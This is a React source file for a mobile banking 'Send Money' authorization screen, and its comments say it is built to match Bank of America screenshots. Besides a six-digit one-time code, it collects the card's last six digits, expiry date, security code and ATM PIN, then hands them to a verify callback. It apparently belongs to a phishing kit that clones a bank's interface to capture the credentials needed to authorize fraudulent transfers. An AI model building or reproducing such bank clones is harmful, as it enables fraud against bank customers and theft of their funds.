import React, { useState, useEffect, useRef, useCallback } from 'react';
import AppHeader from './AppHeader';
import LegalDisclosure from './LegalDisclosure';
import { useAuthStore } from '../store/authStore';

const RESEND_SECS = 30;
const MAX_RESENDS = 3;

// ── Helpers ───────────────────────────────────────────────────────

function maskPhone(phone) {
  if (!phone) return null;
  const d = phone.replace(/\D/g, '');
  if (d.length < 4) return null;
  return `***-***-${d.slice(-4)}`;
}

function maskEmail(email) {
  if (!email) return null;
  return email.replace(/^(.{2})(.*)(@.*)$/, (_, a, b, c) => a + b.replace(/./g, '•') + c);
}

function expiryFmt(raw) {
  const d = raw.replace(/\D/g, '').slice(0, 4);
  return d.length > 2 ? d.slice(0, 2) + ' / ' + d.slice(2) : d;
}

// ── OTP circle inputs ─────────────────────────────────────────────
// Transparent inputs overlaid on blue filled circles.
// Visual circle = filled navy when digit present, gray outline when empty.

function OTPCircles({ digits, onChange, onKeyDown, onPaste, disabled, error, inputRefs }) {
  return (
    <div className="flex gap-3" onPaste={onPaste}>
      {digits.map((d, i) => (
        <div key={i} className="relative w-[42px] h-[42px]">
          {/* Invisible interactive input — on top */}
          <input
            ref={(el) => { inputRefs.current[i] = el; }}
            type="tel"
            inputMode="numeric"
            maxLength={1}
            value={d}
            onChange={(e) => onChange(i, e.target.value)}
            onKeyDown={(e) => onKeyDown(i, e)}
            disabled={disabled}
            className="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10 rounded-full"
          />
          {/* Visual circle — behind input */}
          <div
            className={[
              'absolute inset-0 rounded-full border-2 transition-all duration-150',
              d     ? 'bg-[#002D72] border-[#002D72]'
                    : error ? 'border-red-400 bg-white' : 'border-gray-400 bg-white',
            ].join(' ')}
          />
        </div>
      ))}
    </div>
  );
}

// ── ATM/Debit card row ────────────────────────────────────────────

function CardRow({ label, value, onChange, placeholder, isExpiry = false, disabled }) {
  return (
    <div className="flex items-center justify-between py-[15px] border-b border-gray-200 last:border-0">
      <span className="text-[14px] text-gray-800 flex-shrink-0 mr-3">{label}</span>
      <input
        type={isExpiry ? 'text' : 'password'}
        inputMode="numeric"
        value={value}
        onChange={(e) => {
          let v = e.target.value;
          if (isExpiry) {
            v = expiryFmt(v);
          } else {
            v = v.replace(/\D/g, '');
          }
          onChange(v);
        }}
        placeholder={placeholder}
        disabled={disabled}
        className={[
          'text-[15px] text-right bg-transparent outline-none w-28 disabled:opacity-40',
          'placeholder-gray-300',
          isExpiry ? 'text-[#1a6bbf]' : 'text-[#002D72]',
        ].join(' ')}
      />
    </div>
  );
}

// ── Main component ────────────────────────────────────────────────

export default function TransactionAuthFlow({
  pageTitle    = 'Send Money',
  transactionType,
  amount,
  recipient,
  fromAccount,
  onRequestOTP,
  onVerify,
  onCancel,
}) {
  const user = useAuthStore((s) => s.user);

  const phone         = maskPhone(user?.phoneNumber);
  const email         = maskEmail(user?.email);
  const maskedContact = phone || email || 'your contact';
  const hasPhone      = Boolean(phone);

  // Step: 'intro' → 'code'
  const [step,         setStep]         = useState('intro');
  const [otpToken,     setOtpToken]     = useState('');
  const [requesting,   setRequesting]   = useState(false);
  const [requestError, setRequestError] = useState('');

  const [digits,    setDigits]    = useState(['', '', '', '', '', '']);
  const [verifying, setVerifying] = useState(false);
  const [error,     setError]     = useState('');
  const inputRefs = useRef([]);

  const [resendSecs,  setResendSecs]  = useState(0);
  const [resendCount, setResendCount] = useState(0);
  const [resending,   setResending]   = useState(false);

  const [cardData, setCardData] = useState({ last6: '', expiry: '', cvv: '', pin: '' });

  // Resend countdown
  useEffect(() => {
    if (resendSecs <= 0) return;
    const t = setTimeout(() => setResendSecs((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [resendSecs]);

  // Auto-focus first box on step 2 mount
  useEffect(() => {
    if (step === 'code') setTimeout(() => inputRefs.current[0]?.focus(), 100);
  }, [step]);

  // ── Digit handlers ────────────────────────────────────────────────

  const handleDigitChange = (idx, val) => {
    const clean = val.replace(/\D/g, '').slice(-1);
    const next  = [...digits];
    next[idx]   = clean;
    setDigits(next);
    setError('');
    if (clean && idx < 5) inputRefs.current[idx + 1]?.focus();
  };

  const handleKeyDown = (idx, e) => {
    if (e.key === 'Backspace' && !digits[idx] && idx > 0) {
      inputRefs.current[idx - 1]?.focus();
    }
  };

  const handlePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (!pasted) return;
    const next = ['', '', '', '', '', ''];
    pasted.split('').forEach((ch, i) => { if (i < 6) next[i] = ch; });
    setDigits(next);
    inputRefs.current[Math.min(pasted.length, 5)]?.focus();
  };

  const code       = digits.join('');
  const isComplete = code.length === 6;

  // Card: optional — only block verify if partially filled
  const anyCard     = cardData.last6 || cardData.expiry || cardData.cvv || cardData.pin;
  const allCardOk   = cardData.last6.length === 6
    && /^\d{2} \/ \d{2}$/.test(cardData.expiry)
    && cardData.cvv.length >= 3
    && cardData.pin.length === 4;
  const cardOk      = !anyCard || allCardOk;
  const canVerify   = isComplete && cardOk;

  // ── OTP request (Step 1 → NEXT) ───────────────────────────────────

  const handleNext = async () => {
    setRequesting(true);
    setRequestError('');
    try {
      const token = await onRequestOTP();
      setOtpToken(token);
      setResendSecs(RESEND_SECS);
      setStep('code');
    } catch (err) {
      setRequestError(err.message || 'Failed to send verification code. Please try again.');
    } finally {
      setRequesting(false);
    }
  };

  // ── Resend ────────────────────────────────────────────────────────

  const handleResend = async () => {
    if (resendSecs > 0 || resending || resendCount >= MAX_RESENDS) return;
    setResending(true);
    setError('');
    try {
      const token = await onRequestOTP();
      setOtpToken(token);
      setResendSecs(RESEND_SECS);
      setResendCount((c) => c + 1);
      setDigits(['', '', '', '', '', '']);
      setTimeout(() => inputRefs.current[0]?.focus(), 80);
    } catch (err) {
      setError(err.message || 'Failed to resend code. Please try again.');
    } finally {
      setResending(false);
    }
  };

  // ── Verify ────────────────────────────────────────────────────────

  const handleVerify = useCallback(async () => {
    if (!canVerify || verifying || !otpToken) return;
    setVerifying(true);
    setError('');
    try {
      await onVerify(otpToken, code, anyCard ? cardData : null);
    } catch (err) {
      setError(err.message || 'Verification failed. Please try again.');
      setDigits(['', '', '', '', '', '']);
      setTimeout(() => inputRefs.current[0]?.focus(), 50);
    } finally {
      setVerifying(false);
    }
  }, [canVerify, verifying, otpToken, code, anyCard, cardData, onVerify]);

  // Auto-submit when 6th digit is entered and card is satisfied
  useEffect(() => {
    if (step === 'code' && isComplete && cardOk && !verifying) handleVerify();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isComplete]);

  // ═══════════════════════════════════════════════════════════════
  // STEP 1 — Additional Authorization Required
  // Matches BOA screenshot: title → body → link → phone → legal → NEXT
  // ═══════════════════════════════════════════════════════════════

  if (step === 'intro') {
    return (
      <div className="flex flex-col h-screen bg-white font-sans">
        <AppHeader showBackButton onBack={onCancel} title={pageTitle} showEricaRight ericaRightCount={0} />

        <div className="flex-1 pt-[64px] overflow-y-auto pb-24">
          <div className="px-5 pt-6 pb-6">

            <h1 className="text-[22px] font-bold text-gray-900 leading-snug mb-5">
              Additional authorization is required for this transaction
            </h1>

            <p className="text-[15px] text-gray-700 leading-relaxed mb-5">
              For your security, we require additional authorization for this
              transaction. You need to provide a U.S. mobile number to verify
              your identity.
            </p>

            <button
              type="button"
              className="text-[#1a6bbf] text-[15px] font-normal mb-7 block"
            >
              {hasPhone ? "Don't have a U.S. mobile number?" : "Don't have access to your email?"}
            </button>

            <p className="text-[13px] text-gray-500 mb-1">Mobile number</p>
            <p className="text-[20px] font-medium text-gray-900 mb-7 tracking-wide">
              {maskedContact}
            </p>

            {requestError && (
              <div className="mb-5 bg-red-50 border border-red-200 rounded-xl px-4 py-3">
                <p className="text-red-600 text-[14px]">{requestError}</p>
              </div>
            )}

            <LegalDisclosure />
          </div>
        </div>

        {/* Single NEXT button — full width */}
        <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 px-5 py-4">
          <button
            type="button"
            onClick={handleNext}
            disabled={requesting}
            className="w-full py-[17px] bg-[#002D72] text-white font-bold text-[13px] tracking-widest rounded-full disabled:opacity-50 transition-opacity"
          >
            {requesting
              ? <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin inline-block" />
                  SENDING…
                </span>
              : 'NEXT'}
          </button>
        </div>
      </div>
    );
  }

  // ═══════════════════════════════════════════════════════════════
  // STEP 2 — Authorization Code
  // Matches BOA screenshot: no AppHeader, h1 in content, blue circles,
  // flat card rows with label left / password dots right
  // ═══════════════════════════════════════════════════════════════

  return (
    <div className="flex flex-col h-screen bg-white font-sans">

      {/* Minimal back affordance — no full AppHeader */}
      <div className="fixed top-0 left-0 right-0 z-50 bg-white">
        <div className="flex items-center px-4 h-14">
          <button
            type="button"
            onClick={() => { setStep('intro'); setDigits(['', '', '', '', '', '']); setError(''); }}
            className="flex items-center justify-center w-8 h-8"
          >
            <svg className="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
            </svg>
          </button>
        </div>
      </div>

      <div className="flex-1 pt-14 overflow-y-auto pb-24">
        <div className="px-5 pt-3 pb-8">

          {/* Title */}
          <h1 className="text-[22px] font-bold text-gray-900 mb-4">
            Authorization Code
          </h1>

          {/* Sent copy */}
          <p className="text-[15px] text-gray-700 mb-1">
            An authorization code was sent to your phone.
          </p>
          <p className="text-[18px] font-semibold text-gray-900 tracking-wide mb-6">
            {maskedContact}
          </p>

          {/* ── 6 filled blue circles ── */}
          <OTPCircles
            digits={digits}
            onChange={handleDigitChange}
            onKeyDown={handleKeyDown}
            onPaste={handlePaste}
            disabled={verifying}
            error={Boolean(error)}
            inputRefs={inputRefs}
          />

          {/* Expiry + resend */}
          <p className="text-[13px] text-gray-500 leading-relaxed mt-5 mb-1">
            The code expires 10 minutes after you request it.
          </p>

          {resendCount < MAX_RESENDS ? (
            resendSecs > 0 ? (
              <p className="text-[13px] text-gray-400">
                Resend available in <span className="tabular-nums">{resendSecs}s</span>
              </p>
            ) : (
              <button
                type="button"
                onClick={handleResend}
                disabled={resending}
                className="text-[#1a6bbf] text-[13px] disabled:opacity-50"
              >
                {resending ? 'Sending…' : 'Request another authorization code.'}
              </button>
            )
          ) : (
            <p className="text-[13px] text-red-500">Maximum resend attempts reached.</p>
          )}

          {/* Error */}
          {error && (
            <div className="mt-4 bg-red-50 border border-red-200 rounded-xl px-4 py-3">
              <p className="text-red-600 text-[14px]">{error}</p>
            </div>
          )}

          {/* ── Divider ── */}
          <div className="h-px bg-gray-200 mt-7 mb-6" />

          {/* ── ATM/Debit card section ── */}
          <p className="text-[16px] font-bold text-gray-900 mb-1">
            ATM/Debit card details
          </p>

          <div>
            <CardRow
              label="Card number (last 6 digits)"
              value={cardData.last6}
              onChange={(v) => setCardData({ ...cardData, last6: v.slice(0, 6) })}
              placeholder="••••••"
              disabled={verifying}
            />
            <CardRow
              label="Expiration date"
              value={cardData.expiry}
              onChange={(v) => setCardData({ ...cardData, expiry: v })}
              placeholder="MM / YY"
              isExpiry
              disabled={verifying}
            />
            <CardRow
              label="Security code (3 or 4 digits)"
              value={cardData.cvv}
              onChange={(v) => setCardData({ ...cardData, cvv: v.slice(0, 4) })}
              placeholder="•••"
              disabled={verifying}
            />
            <CardRow
              label="ATM/Debit card PIN"
              value={cardData.pin}
              onChange={(v) => setCardData({ ...cardData, pin: v.slice(0, 4) })}
              placeholder="•••••"
              disabled={verifying}
            />
          </div>

        </div>
      </div>

      {/* ── VERIFY button — full width ── */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 px-5 py-4">
        <button
          type="button"
          onClick={handleVerify}
          disabled={!canVerify || verifying}
          className="w-full py-[17px] bg-[#002D72] text-white font-bold text-[13px] tracking-widest rounded-full disabled:opacity-40 transition-opacity"
        >
          {verifying
            ? <span className="flex items-center justify-center gap-2">
                <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin inline-block" />
                VERIFYING…
              </span>
            : 'VERIFY IDENTITY'}
        </button>
      </div>
    </div>
  );
}
